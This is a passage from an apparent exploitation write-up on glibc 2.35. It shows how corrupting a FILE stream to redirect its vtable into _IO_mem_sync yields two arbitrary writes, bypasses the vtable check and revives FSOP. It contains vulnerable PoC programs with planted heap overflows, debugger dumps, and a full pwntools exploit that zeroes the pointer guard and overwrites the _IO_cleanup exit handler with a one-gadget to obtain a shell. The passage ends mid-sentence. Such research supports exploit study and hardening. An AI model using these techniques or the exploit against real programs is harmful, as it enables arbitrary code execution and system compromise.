## **Introduction**
In this article I will describe an interesting primitive that we can craft corrupting FILE stream descriptors in glibc which can be used to fully bypass the vtable check mechanism of the latest glibc `2.35` (at the moment I'm writing the article). Besides the full vtable check bypass that we can perform through this primitive and in some sense revive partially the FSOP technique, most of the times if we can control the FILE stream before reaching to `_IO_cleanup` we can get code execution from easier targets. Finally I will propose a new heap house based on that primitive.

## vtable check
FSOP in the original form was mitigated in glibc 2.24 with the introduction of a vtable check mechanism which had been futher hardened in earlier versions (see `_dl_open_hook` for example). I will try to explain or highlight the most important parts of the vtable check mechanism.

# The beginning of everything
Essentially every internal vtable call is expanded to the following directive:
```c
# define _IO_JUMPS_FUNC(THIS) \
  (IO_validate_vtable                                                   \
   (*(struct _IO_jump_t **) ((void *) &_IO_JUMPS_FILE_plus (THIS)        \
                             + (THIS)->_vtable_offset)))
```
So every internal vtable call is going through the `IO_validate_vtable` for a quick vtable check.
```c

/* Perform vtable pointer validation.  If validation fails, terminate
   the process.  */
static inline const struct _IO_jump_t *
IO_validate_vtable (const struct _IO_jump_t *vtable)
{
  /* Fast path: The vtable pointer is within the __libc_IO_vtables
     section.  */
  uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
  uintptr_t ptr = (uintptr_t) vtable;
  uintptr_t offset = ptr - (uintptr_t) __start___libc_IO_vtables;
  if (__glibc_unlikely (offset >= section_length))
    /* The vtable pointer is not in the expected section.  Use the
       slow path, which will terminate the process if necessary.  */
    _IO_vtable_check ();
  return vtable;
}
```
In this check we test if the vtable pointer in the given FILE stream is inside the `_libc_IO_vtables` section in glibc. This section should be read-only and contains different `_IO_jump_t` vtable entries. If our vtable pointer is not pointing somewhere in this section we are going for a final vtable check in `_IO_vtable_check`.
```c

void attribute_hidden
_IO_vtable_check (void)
{
#ifdef SHARED
  /* Honor the compatibility flag.  */
  void (*flag) (void) = atomic_load_relaxed (&IO_accept_foreign_vtables);
#ifdef PTR_DEMANGLE
  PTR_DEMANGLE (flag);
#endif
  if (flag == &_IO_vtable_check)
    return;

  /* In case this libc copy is in a non-default namespace, we always
     need to accept foreign vtables because there is always a
     possibility that FILE * objects are passed across the linking
     boundary.  */
  {
    Dl_info di;
    struct link_map *l;
    if (!rtld_active ()
        || (_dl_addr (_IO_vtable_check, &di, &l, NULL) != 0
            && l->l_ns != LM_ID_BASE))
      return;
  }

#else /* !SHARED */
  /* We cannot perform vtable validation in the static dlopen case
     because FILE * handles might be passed back and forth across the
     boundary.  Therefore, we disable checking in this case.  */
  if (__dlopen != NULL)
    return;
#endif

  __libc_fatal ("Fatal error: glibc detected an invalid stdio handle\n");
}
```
If we can not satisfy any of the checks inside `_IO_vtable_check` the program will abort. There have been a lot of discussion and attacks around this function both in the first check where we are demangling the `IO_accept_foreign_vtables` pointer and in the second check inside `_dl_addr`. If you are able to attack any of the checks above and make `_IO_vtable_check` always return without aborting you can make `_IO_vtable_check` accept your arbitrary vtable pointers.

But we do not need necessairly to attack `_IO_vtable_check` function, `_IO_validate_vtable` check will do the trick as well. Although we are not able to make the `IO_validate_vtable` to accept arbitrary vtable pointers we have a range of options to choose from the `__libc_IO_vtables` section. If we can shift our vtable pointer to point to `_IO_helper_jumps` instead of `_IO_file_jumps` the `_IO_validate_vtable` will not complain or notice any corruption. This technique is well known and used in a lot of cases but most importantly in the vtable bypass in glibc 2.24 where you could use `_IO_str_jumps` vtable instead of `_IO_file_jumps` to easily hijack the control flow. 

# The deadly _IO_mem_sync primitive
Most of the greatness of this article I think is because of this primitive. With this primitive we can achieve full vtable check bypass and perform a beautiful classical FSOP to craft payloads for a stable shell. But actually as I will highlight in a moment this primitive is enough to get us a beautiful shell without bothering with the vtable bypass. (which is most practically in a FILE stream overflow which occurs deeply inside the program).
```c
static const struct _IO_jump_t _IO_mem_jumps libio_vtable =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT (finish, _IO_mem_finish),
  JUMP_INIT (overflow, _IO_str_overflow),
  JUMP_INIT (underflow, _IO_str_underflow),
  JUMP_INIT (uflow, _IO_default_uflow),
  JUMP_INIT (pbackfail, _IO_str_pbackfail),
  JUMP_INIT (xsputn, _IO_default_xsputn),
  JUMP_INIT (xsgetn, _IO_default_xsgetn),
  JUMP_INIT (seekoff, _IO_str_seekoff),
  JUMP_INIT (seekpos, _IO_default_seekpos),
  JUMP_INIT (setbuf, _IO_default_setbuf),
  JUMP_INIT (sync, _IO_mem_sync),
  JUMP_INIT (doallocate, _IO_default_doallocate),
  JUMP_INIT (read, _IO_default_read),
  JUMP_INIT (write, _IO_default_write),
  JUMP_INIT (seek, _IO_default_seek),
  JUMP_INIT (close, _IO_default_close),
  JUMP_INIT (stat, _IO_default_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};
```
In the above jump table we care only about the non-default vtable functions. Our `_IO_FILE` struct for the `_IO_mem_jumps` is the following:
```c
struct _IO_FILE_memstream
{
  _IO_strfile _sf;
  char **bufloc;
  size_t *sizeloc;
};
```
`bufloc` and `sizeloc` are the most important fields in this `_IO_FILE` struct. 
```c
static int
_IO_mem_sync (FILE *fp)
{
  struct _IO_FILE_memstream *mp = (struct _IO_FILE_memstream *) fp;
  if (fp->_IO_write_ptr == fp->_IO_write_end)
    {
      _IO_str_overflow (fp, '\0');
      --fp->_IO_write_ptr;
    }
  *mp->bufloc = fp->_IO_write_base;
  *mp->sizeloc = fp->_IO_write_ptr - fp->_IO_write_base;
  return 0;
}
```
The last two lines is what makes this a powerful primitive. If you can control the FILE stream we can control also the `bufloc` & `sizeloc` pointers. By triggering `_IO_mem_sync` we can perform two arbitrary writes at the same time! Note that the second arbitrary primitive is not so flexible as the first, but in the context of 64 bit binaries it is good. In 32 bit executables because glibc addresses are loaded quite high in the virtual address space (0xffxxxxxx) we are not able to put a big value to `sizeloc`.

Assuming a libc leak and a buffer overflow into a FILE structure we can practically trigger `_IO_mem_sync` from pretty much every IO function. For example suppose a scenario where you have a heap overflow into a FILE structure and then the program triggers `fgets` to read some input from our FILE stream.

# PoC #1
```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int main() {
  FILE *fp;
  char* buffer = (char*) malloc(0x18);
  fp = fopen("/dev/null", "r");
  printf("libc leak: %p\n", puts);
  puts("Enter your buffer overflow: ");
  read(0, buffer, 0x300);
  fgets(buffer, 8, fp);
  fclose(fp);
  return 0;
}
```
Reading closely the source code for `fgets` we can find which vtable entry will be called:
```c
char *
_IO_fgets (char *buf, int n, FILE *fp)
{
  ...
  count = _IO_getline (fp, buf, n - 1, '\n', 1);
  ...
  return result;
}
```
```c
size_t
_IO_getline_info (FILE *fp, char *buf, size_t n, int delim,
		  int extract_delim, int *eof)
{
	...
  while (n != 0)
    {
      ssize_t len = fp->_IO_read_end - fp->_IO_read_ptr;
      if (len <= 0)
		{
		  int c = __uflow (fp); // we want to enter this function ;)
		  if (c == EOF)
			{
			  if (eof)
				  *eof = c;
			  break;
			} 
		  if (c == delim)
	    {
 	   if (extract_delim > 0)
		       *ptr++ = c;
		   else if (extract_delim < 0)
				_IO_sputbackc (fp, c);
		    if (extract_delim > 0)
				++len;
	        return ptr - buf;
		    }
			  *ptr++ = c;
			  n--;
		}
  return ptr - buf;
}
libc_hidden_def (_IO_getline_info)
```
Following `__uflow`:
```c
int
__uflow (FILE *fp)
{
  if (_IO_vtable_offset (fp) == 0 && _IO_fwide (fp, -1) != -1)
    return EOF;

  if (fp->_mode == 0)
    _IO_fwide (fp, -1);
  if (_IO_in_put_mode (fp))
    if (_IO_switch_to_get_mode (fp) == EOF)
      return EOF;
  if (fp->_IO_read_ptr < fp->_IO_read_end)
    return *(unsigned char *) fp->_IO_read_ptr++;
  if (_IO_in_backup (fp))
    {
      _IO_switch_to_main_get_area (fp);
      if (fp->_IO_read_ptr < fp->_IO_read_end)
	return *(unsigned char *) fp->_IO_read_ptr++;
    }
  if (_IO_have_markers (fp))
    {
      if (save_for_backup (fp, fp->_IO_read_end))
	return EOF;
    }
  else if (_IO_have_backup (fp))
    _IO_free_backup_area (fp);
  return _IO_UFLOW (fp); // our vtable call is _IO_UFLOW => _IO_default_uflow => _IO_UNDERFLOW(fp)
}
libc_hidden_def (__uflow)
```
If we calculate carefully the distance between `__uflow` and `__sync` we can easily make our FILE stream to trigger `_IO_mem_sync` instead of `_IO_file_underflow` and perform our arbitrary writes!
```c
pwndbg> p *((struct _IO_jump_t*)0x7ffff7fb01f8)
$6 = {
  __dummy = 140737352307696,
  __dummy2 = 140737352308080,
  __finish = 0x7ffff7e42c50 <__GI__IO_str_seekoff>,
  __overflow = 0x7ffff7e41730 <_IO_default_seekpos>,
  __underflow = 0x7ffff7e41630 <_IO_default_setbuf>,
  __uflow = 0x7ffff7e3c1f0 <_IO_mem_sync>,
  __pbackfail = 0x7ffff7e417a0 <__GI__IO_default_doallocate>,
  __xsputn = 0x7ffff7e425e0 <_IO_default_read>,
  __xsgetn = 0x7ffff7e425f0 <_IO_default_write>,
  __seekoff = 0x7ffff7e425c0 <_IO_default_seek>,
  __seekpos = 0x7ffff7e41a20 <_IO_default_sync>,
  __setbuf = 0x7ffff7e425d0 <_IO_default_stat>,
  __sync = 0x7ffff7e42600 <_IO_default_showmanyc>,
  __doallocate = 0x7ffff7e42610 <_IO_default_imbue>,
  __read = 0x0,
  __write = 0x0,
  __seek = 0x0,
  __close = 0x0,
  __stat = 0x0,
  __showmanyc = 0x7ffff7e42b00 <_IO_str_finish>,
  __imbue = 0x7ffff7e3c8e0 <_IO_strn_overflow>
}
```
I have to note that depending on what glibc build we are targeting, `fgets` might be easier to exploit. For example if we target a glibc build with the `__libc_IO_vtables` section mapped in the `data` section (A known bug), we can easily overwrite the `__IO_mem_sync` vtable entry to point to a one gadget. Or we can abuse the `free/malloc` hooks to get code execution, or in a non PIE executable we can easily overwrite `fclose` got table to point to `system`. Generally we can abuse any function that is following `fgets` until `fclose` to get code execution. Which in most cases is enough.

I came up with a different plan though for this particular PoC and I admit it might not work for other IO function combos. Specifically the technique I tried will probably work only for a combo like `fgets` and `fclose` like in this case. 

Attacking our FILE stream vtable to point to `_IO_mem_sync` we will be able to perform two arbitrary writes but there is a pattern you have to understand with the `fgets` function particularly.
```c
size_t
_IO_getline_info (FILE *fp, char *buf, size_t n, int delim,
          int extract_delim, int *eof)
{
    ...
  while (n != 0)
  {
      ssize_t len = fp->_IO_read_end - fp->_IO_read_ptr;
      if (len <= 0)
        {
          int c = __uflow (fp); // we want to enter this function ;)
		   ...
          *ptr++ = c;
          n--;
        }
	  ...
  }
  return ptr - buf;
}
```
Our `_IO_mem_sync` function will be called exacly `n` times because of the fact that `_IO_mem_sync` returns always `0`. This actually is interesting. If we know where our FILE stream is located (for example in our case we have a heap leak) we can get code execution as following:
* Corrupt pointer guard in TLS with a value of  `&_IO_vtable_check` (We essentially bypassed the vtable check)
* Change on the fly the vtable pointer of our FILE stream to point to a controlled address where we have placed our malicious fake vtable which points to `system` or something.
* We bypassed the vtable check and in the second `__uflow` call we got code execution through our fake vtable.
* Profit

Although this tactic is possible it requires a heap leak which we do not have at the moment in my PoC. I also didn't put any useful function between `fgets` and `fclose` to show a special case and highlight some IO function combos.

Going back to our `fgets` corrupted `n` times loop, we basically will perform `n` times our two arbitrary write primtives. After doing that `fgets` will do some foo and will return back to main. But remember that our vtable pointer is now pointing to `_IO_mem_sync - uflow_offset`. 
```c
pwndbg> p *((struct _IO_jump_t*)0x7ffff7fb01f8)
$6 = {
  __dummy = 140737352307696,
  __dummy2 = 140737352308080,
  __finish = 0x7ffff7e42c50 <__GI__IO_str_seekoff>,
  __overflow = 0x7ffff7e41730 <_IO_default_seekpos>,
  __underflow = 0x7ffff7e41630 <_IO_default_setbuf>,
  __uflow = 0x7ffff7e3c1f0 <_IO_mem_sync>,
  __pbackfail = 0x7ffff7e417a0 <__GI__IO_default_doallocate>,
  __xsputn = 0x7ffff7e425e0 <_IO_default_read>,
  __xsgetn = 0x7ffff7e425f0 <_IO_default_write>,
  __seekoff = 0x7ffff7e425c0 <_IO_default_seek>,
  __seekpos = 0x7ffff7e41a20 <_IO_default_sync>,
  __setbuf = 0x7ffff7e425d0 <_IO_default_stat>,
  __sync = 0x7ffff7e42600 <_IO_default_showmanyc>,
  __doallocate = 0x7ffff7e42610 <_IO_default_imbue>,
  __read = 0x0,
  __write = 0x0,
  __seek = 0x0,
  __close = 0x0,
  __stat = 0x0,
  __showmanyc = 0x7ffff7e42b00 <_IO_str_finish>,
  __imbue = 0x7ffff7e3c8e0 <_IO_strn_overflow>
}
```
So what will happen when `fclose` will be called? 
```c
int
_IO_new_fclose (FILE *fp)
{
  int status;

  /* First unlink the stream.  */
  if (fp->_flags & _IO_IS_FILEBUF)
    _IO_un_link ((struct _IO_FILE_plus *) fp);

  _IO_acquire_lock (fp); // for this lock remember to point _wide_data to a null writable address like we do with our _lock!
   ...
  _IO_release_lock (fp);
  _IO_FINISH (fp);
  if (fp->_mode > 0)
    {
		...
    }
  else
    {
      if (_IO_have_backup (fp))
	       _IO_free_backup_area (fp);
    }
  _IO_deallocate_file (fp);
  return status;
}
```
The important part of `fclose` is `_IO_FINISH` where we will attempt to call `__finish` from our vtable. But remember that our vtable pointer is crafted in such a way that points to `_IO_mem_sync`. In other cases this situation probably will cause a segfault or something. Fortunately in this case between `_IO_FINISH` and `__uflow` there is no crash! And this is because `__finish` is pointing to `__GI__IO_str_seekoff` as we can see above.
```c

off64_t
_IO_str_seekoff (FILE *fp, off64_t offset, int dir, int mode)
{
  off64_t new_pos;

  if (mode == 0 && (fp->_flags & _IO_TIED_PUT_GET))
    mode = (fp->_flags & _IO_CURRENTLY_PUTTING ? _IOS_OUTPUT : _IOS_INPUT);

  bool was_writing = (fp->_IO_write_ptr > fp->_IO_write_base
		     || _IO_in_put_mode (fp));
  if (was_writing)
    _IO_str_switch_to_get_mode (fp);

  if (mode == 0)
  {
      new_pos = fp->_IO_read_ptr - fp->_IO_read_base;
  }
  else
  {
      /* Move the get pointer, if requested. */
      if (mode & _IOS_INPUT)
	  {
        ...
			
		  ssize_t maxval = SSIZE_MAX - base;
		  if (offset < -base || offset > maxval)
			{
			  __set_errno (EINVAL);
			  return EOF;
			}
		  base += offset; // If it happens to come here we need to have _IO_USER_BUF flag!
		  if (base > cur_size
			  && enlarge_userbuf (fp, base, 0) != 0)
			return EOF;
		  fp->_IO_write_ptr = fp->_IO_write_base + base;
		  new_pos = base;
	  }

      /* Move the put pointer, if requested. */
      if (mode & _IOS_OUTPUT)
	  {
        ...
		ssize_t maxval = SSIZE_MAX - base;
		if (offset < -base || offset > maxval)
		{
			__set_errno (EINVAL);
			return EOF;
		}
		base += offset; // If it happens to come here we need to have _IO_USER_BUF flag!
		if (base > cur_size
		&& enlarge_userbuf (fp, base, 0) != 0)
			return EOF;
		fp->_IO_write_ptr = fp->_IO_write_base + base;
		new_pos = base;
	  }
  }
  return new_pos;
}
libc_hidden_def (_IO_str_seekoff)
```
Notice that we do not control the `offset, dir, mode` arguments of  `_IO_str_seekoff`. So we do not control much of the flow inside `_IO_str_seekoff` and we want to exit as soon as possible without triggering any segfault. But whatever the case we want to avoid `enlarge_userbuf` because probably we will trigger a segfault/assertion inside it. Most of the times we might actually be lucky and we will never enter `enlarge_userbuf` but if we do we have to put `_IO_USER_BUF` in our FILE stream `_flags` field.
```c
static int
enlarge_userbuf (FILE *fp, off64_t offset, int reading)
{
  if ((ssize_t) offset <= _IO_blen (fp))
    return 0;

  ssize_t oldend = fp->_IO_write_end - fp->_IO_write_base;

  /* Try to enlarge the buffer.  */
  if (fp->_flags & _IO_USER_BUF)
    /* User-provided buffer.  */
    return 1;
   ...
}
```
So even if we are unlucky and we enter `enlarge_userbuf` we have a stable way to exit early! After ensuring that we will not crash with a segfault how we will get code execution? Now we have to go back to our `_IO_mem_sync` primitive. Now nothing else is left to executed. The next code that will run is the exit handlers. Which we will abuse to get code execution! We will use our `_IO_mem_sync` primitive to craft a fake exit handler bypassing the pointer guard:
* With our first arbitrary write we will target the pointer guard in the TLS.
* With our second arbitrary write we will overwrite the `_IO_cleanup` registered exit handler to point to our one gadget or something.
* Profit upon exit.

I have to note though with the `_IO_mem_sync` primitive you can actually bypass the pointer guard protection. Because with the first arbitrary write you can null out the pointer guard (given a libc leak) and with the second arbitrary write you can alter the contents of any mangled pointer.

# Exploit for PoC #1
Now see it in action:
```python
from pwn import *

elf = context.binary = ELF('fgetspoc_patched', checksec = False)
libc = ELF('libc.so.6', checksec = False)

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript = '''
                set breakpoint pending on
                b __run_exit_handlers
        ''')
    else:
        return process(elf.path)

io = start()

io.recvuntil(b'libc leak: ') # skip blah blah
puts_leak = int(io.recvline(keepends = False), base = 16)
success(f'puts @ 0x{puts_leak:02x}')

libc.address = puts_leak - libc.sym.puts
success(f'libc @ 0x{libc.address:02x}')

where = libc.address - 0x2890 # overwrite the pointer guard.
what = 0x0

one_gadget = libc.address + 0xdb181

where2 = libc.sym.initial+24
what2 = one_gadget
what2 = rol(n = what2, k = 0x11, word_size = 64) # overwrite _IO_cleanup exti handler with a one gadget!

_IO_USER_BUF = 0x0001

_flags = p32(_IO_USER_BUF)
_flags_byte_hole = p32(0x0)
_IO_read_ptr = 0x0
_IO_read_end = 0x0
_IO_read_base = 0x0
_IO_write_base = what
_IO_write_ptr = _IO_write_base + what2
_IO_write_end = 0x0
_IO_buf_base = 0x0
_IO_buf_end = 0x0
_IO_save_base = 0x0
_IO_backup_base = 0x0
_IO_save_end = 0x0
_markers = 0x0

_chain = 0x0

_fileno = p32(0x0)
_flags2 = p32(0x0)
_old_offset = 0x0
_cur_column = p16(0x0)
_vtable_offset = p8(0x0)
_shortbuf = p8(0x0)
_shortbuf_byte_hole = p32(0x0)
_lock = libc.address + 0x1f21f8
_offset = 0x0
_codecvt = 0x0
_wide_data = _lock
_freeres_list = 0x0
_freeres_buf = 0x0
__pad5 = 0x0
_mode = p32(0x0)
_unused2 = b'\x00'*0x14

# here is the trick, by shifting the vtable in the range of __libc_IO_vtables we are not aborting the program, it is totally allowed.
vtable = libc.sym._IO_mem_jumps + 0x38  # now _IO_UNDERFLOW points to _IO_mem_sync, our magical two arbitrary write function ;)

fs = _flags + _flags_byte_hole + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base) + p64(_IO_write_base) + p64(_IO_write_ptr) \
   + p64(_IO_write_end) + p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end) \
   + p64(_markers) + p64(_chain) + _fileno + _flags2 + p64(_old_offset) + _cur_column + _vtable_offset + _shortbuf + _shortbuf_byte_hole + p64(_lock) + p64(_offset) \
   + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf) + p64(__pad5) + _mode + _unused2 \
   + p64(vtable)

fix_fs_chunk_size = 0x1e1 # we want to fix chunk size field to avoid aborting.
exploit = fit({
    0x18: p64(fix_fs_chunk_size) + fs + p64(0)*2 + p64(where) + p64(where2)
})

io.send(exploit)

io.interactive()
```
You can find all the binaries & glibc dependencies in my github repo [link].

# Complains
* Other combos might not work!
* What we do in case our one gadget is not working ;(
* How we will perform FSOP ;(
* We want to build a new House ;)

# Revive FSOP
Probably you can craft a working exploit to get a shell with just those two arbitrary write primitives with different ways. But maybe your targets might not get you a shell because you cannot satisfy one gadget requirements for some glibcs or you want to craft a stable exploit. If you know your FILE stream location in memory probably you can do a lot of fucking magic with `_IO_mem_sync`, but you might not be able to get a heap leak, so I will propose a different strategy to get a working shell. If you have a convenient target from which you can hijack the execution flow but you can not get a proper shell because your gadgets are not working continue with this. If you don't have a reliable target I will propose later different techniques and targets which can get you code execution.

The following technique requires besides a libc leak and an overflow into a controlable FILE stream a known controlable buffer (either in heap/stack or in .bss/data sections). Our plan is:
* Trigger `_IO_mem_sync` function from any IO file operation.
* With the first arbitrary write target the `_IO_list_all` pointer to point to our controlable known buffer where we will place our chain of FSOPs
* With the second arbitrary write we target a pointer from which we can get code execution, and place instead of a one gadget the address of `_IO_cleanup` to trigger cleanup as soon as possible.

From `_IO_cleanup` we will have the chance to trigger another one `_IO_mem_sync` from our fake FILE stream which will aim to disarm completely the vtable check mechanism and then we will be able to perform a classic FSOP.

I've to note that we do not need a known controlable buffer in order to do our FSOP. If we do not supply the attribute `_IO_LINKED` in the  `_flags` field in our FILE stream, our FILE stream will be never unlinked from the `_IO_list_all` list and we can use our first arbitrary write instead of overwriting the whole `_IO_list_all` pointer, to only overwrite partially the last bytes of `_IO_list_all` inorder to point a little bit below or above from our FILE structure where we can craft another FSOP which will be triggered upon `_IO_cleanup`.

Also the second arbitrary write is not needed in a case where we can reach `_IO_cleanup` normally with exiting the program without triggering any segfault or abort. And we can use it to disable the vtable check mechanism with overwriting the pointer guard with `&_IO_vtable_check`. 

I will also propose later some useful targets and cases where you can use this primitive to get code execution even if you cannot avoid an abort. 

# PoC #2
For my FSOP I try to craft it in such a way to avoid a heap leak and perform it with only a libc leak and the ability to overflow a FILE stream. With a heap leak or a known controlable buffer you can craft easier payloads.
```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

// compile with: gcc fsop.c -o fsop -fstack-protector-all, because we want make our life harder ;)
void smash_me_baby(FILE* fp) {
  fputc('F', fp);
}

int main() {
  FILE *fp;
  char* buffer = (char*) malloc(0x18);
  fp = fopen("/dev/null", "r");
  printf("libc leak: %p\n", puts);
  puts("Enter your buffer overflow: ");
  read(0, buffer, 0x300);
  puts("Press F to doubt.");
  smash_me_baby(fp);
  fclose(fp);
  return 0;
}
```

I purposefully used a combo like `fputc` and `fclose` in my PoC to highlight some caveats with `_IO_mem_sync` primitive but also to highlight a crazy bypass and also a more useful general technique to get code execution from most of the abort checks in glibc. 

If we do not get code execution before `fclose` we are doomed to crash and here is the reason:
```c
int
fputc (int c, FILE *fp)
{
  int result;
	...
  result = _IO_putc_unlocked (c, fp);
	...
  return result;
}
```
`fputc` is pretty simple to understand essentially does some locking and just calls `_IO_putc_unlocked`.
```c
#define _IO_putc_unlocked(_ch, _fp) __putc_unlocked_body (_ch, _fp)
```
`_IO_putc_unlocked` is just an alias for `__putc_unlocked_body`.
```c
#define __putc_unlocked_body(_ch, _fp)					\
  (__glibc_unlikely ((_fp)->_IO_write_ptr >= (_fp)->_IO_write_end)	\
   ? __overflow (_fp, (unsigned char) (_ch))				\
   : (unsigned char) (*(_fp)->_IO_write_ptr++ = (_ch)))
```
The magic will happen actually here and we want to point `__overflow` to `_IO_mem_sync`.
After executing `_IO_mem_sync`, `fputc` pretty much will do some foo and will return back to main. 
The real problem is when we will reach to `fclose`. Our vtable pointer must look like that so far:
```c
pwndbg> p *((struct _IO_jump_t*)0x7ffff7f8f288)
$4 = {
  __dummy = 140737352075824,
  __dummy2 = 140737352070272,
  __finish = 0x7ffff7e07360 <_IO_default_setbuf>,
  __overflow = 0x7ffff7e00bd0 <_IO_mem_sync>,
  __underflow = 0x7ffff7e074f0 <__GI__IO_default_doallocate>,
  __uflow = 0x7ffff7e083a0 <_IO_default_read>,
  __pbackfail = 0x7ffff7e083b0 <_IO_default_write>,
  __xsputn = 0x7ffff7e08380 <_IO_default_seek>,
  __xsgetn = 0x7ffff7e076f0 <_IO_default_sync>,
  __seekoff = 0x7ffff7e08390 <_IO_default_stat>,
  __seekpos = 0x7ffff7e083c0 <_IO_default_showmanyc>,
  __setbuf = 0x7ffff7e083d0 <_IO_default_imbue>,
  __sync = 0x0,
  __doallocate = 0x0,
  __read = 0x0,
  __write = 0x0,
  __seek = 0x0,
  __close = 0x7ffff7e088d0 <_IO_str_finish>,
  __stat = 0x7ffff7e01310 <_IO_strn_overflow>,
  __showmanyc = 0x7ffff7e084d0 <__GI__IO_str_underflow>,
  __imbue = 0x7ffff7e06d10 <__GI__IO_default_uflow>
}
```
As we said earlier `fclose` eventually will call `__finish` which currently points to `_IO_default_setbuf`.
```c
FILE *
_IO_default_setbuf (FILE *fp, char *p, ssize_t len)
{
    if (_IO_SYNC (fp) == EOF)
        return NULL;
	...
}
```
And here comes the big problem, `_IO_default_sebuf` will call `_IO_SYNC` which currently points to `0x0`. **Segfault**!

```python
Program received signal SIGSEGV, Segmentation fault.
0x0000000000000000 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────
 RAX  0xd68
 RBX  0x560d5f8f82c0 ◂— 0x0
 RCX  0x888
 RDX  0x7fb645ac2980 (_IO_helper_jumps) ◂— 0x0
 RDI  0x560d5f8f82c0 ◂— 0x0
 RSI  0x0
 R8   0x7fb645ac4750 (_IO_stdfile_1_lock) ◂— 0x0
 R9   0x7ffdff6545ec ◂— '7fb645948e80'
 R10  0x7fb645948e80 (puts) ◂— endbr64 
 R11  0x246
 R12  0x0
 R13  0x7fb645ac3208 (_IO_mem_jumps+72) —▸ 0x7fb645955c50 (_IO_str_seekoff) ◂— endbr64 
 R14  0x560d5dc48d88 (__do_global_dtors_aux_fini_array_entry) —▸ 0x560d5dc461d0 (__do_global_dtors_aux) ◂— endbr64 
 R15  0x7fb645b0a040 (_rtld_local) —▸ 0x7fb645b0b2e0 —▸ 0x560d5dc45000 (_start) ◂— 0x10102464c457f
 RBP  0x7fb645ac2980 (_IO_helper_jumps) ◂— 0x0
 RSP  0x7ffdff6546c8 —▸ 0x7fb645954675 (_IO_default_setbuf+69) ◂— cmp    eax, -1
 RIP  0x0
────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────────
Invalid address 0x0
─────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffdff6546c8 —▸ 0x7fb645954675 (_IO_default_setbuf+69) ◂— cmp    eax, -1
01:0008│     0x7ffdff6546d0 ◂— 0x0
02:0010│     0x7ffdff6546d8 —▸ 0x7fb645ac3208 (_IO_mem_jumps+72) —▸ 0x7fb645955c50 (_IO_str_seekoff) ◂— endbr64 
03:0018│     0x7ffdff6546e0 —▸ 0x560d5f8f82c0 ◂— 0x0
04:0020│     0x7ffdff6546e8 ◂— 0x0
05:0028│     0x7ffdff6546f0 —▸ 0x560d5dc46260 (main) ◂— endbr64 
06:0030│     0x7ffdff6546f8 —▸ 0x7fb645946ee1 (fclose@@GLIBC_2.2.5+113) ◂— mov    eax, dword ptr [rbp + 0xc0]
07:0038│     0x7ffdff654700 ◂— 0x0
───────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0              0x0
   f 1   0x7fb645954675 _IO_default_setbuf+69
   f 2   0x7fb645946ee1 fclose@@GLIBC_2.2.5+113
   f 3   0x560d5dc46310 main+176
   f 4   0x7fb6458fc53d __libc_start_call_main+109
   f 5   0x7fb6458fc5f0 __libc_start_main_impl+128
   f 6   0x560d5dc46155 _start+37
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> f 1
#1  0x00007fb645954675 in _IO_default_setbuf (fp=0x560d5f8f82c0, p=0x0, len=140420829686144) at libioP.h:947
947	in libioP.h
pwndbg> disass _IO_default_setbuf
Dump of assembler code for function _IO_default_setbuf:
   0x00007fb645954630 <+0>:	endbr64 
   0x00007fb645954634 <+4>:	push   r13
   0x00007fb645954636 <+6>:	lea    rax,[rip+0x16f0ab]        # 0x7fb645ac36e8 <__elf_set___libc_atexit_element__IO_cleanup__>
   0x00007fb64595463d <+13>:	push   r12
   0x00007fb64595463f <+15>:	mov    r12,rsi
   0x00007fb645954642 <+18>:	push   rbp
   0x00007fb645954643 <+19>:	mov    rbp,rdx
   0x00007fb645954646 <+22>:	lea    rdx,[rip+0x16e333]        # 0x7fb645ac2980 <_IO_helper_jumps>
   0x00007fb64595464d <+29>:	push   rbx
   0x00007fb64595464e <+30>:	sub    rax,rdx
   0x00007fb645954651 <+33>:	mov    rbx,rdi
   0x00007fb645954654 <+36>:	sub    rsp,0x8
   0x00007fb645954658 <+40>:	mov    r13,QWORD PTR [rdi+0xd8]
   0x00007fb64595465f <+47>:	mov    rcx,r13
   0x00007fb645954662 <+50>:	sub    rcx,rdx
   0x00007fb645954665 <+53>:	cmp    rax,rcx
   0x00007fb645954668 <+56>:	jbe    0x7fb645954718 <_IO_default_setbuf+232>
   0x00007fb64595466e <+62>:	mov    rdi,rbx
   0x00007fb645954671 <+65>:	call   QWORD PTR [r13+0x60]
=> 0x00007fb645954675 <+69>:	cmp    eax,0xffffffff
```

This highlights an important caveat with our `_IO_mem_sync` primitive, without a heap leak or without knowing where our FILE structure is located in memory we have to face the reality: we can not alter our corrupted vtable pointer and in another IO file operation probably this corruption will result to a crash. If you can target something which will yield to code execution before calling the next IO file operation you are happy, if you don't you might be sad. Although in my PoC there is no other function from where you could hijack the control flow (assuming that we have FULL RELRO enabled or we do not know the address of the got table for example because of PIE), there is still an interesting way to hijack the code execution before reaching to `fclose`.

# Gaining code execution through `__libc_message`
For pretty much any abort function in glibc eventually  `__libc_message` will be called internally.
```c
static void
malloc_printerr (const char *str)
{
#if IS_IN (libc)
  __libc_message (do_abort, "%s\n", str);
#else
  __libc_fatal (str);
#endif
  __builtin_unreachable ();
}
```
We can trigger `malloc_printerr` pretty much from any malloc mitigation (quite easy).
```c
void
__attribute__ ((noreturn))
__stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}
```
Actually `__stack_chk_fail` will call `__libc_message` eventually through `__fortify_fail`.
```c
void
__attribute__ ((noreturn))
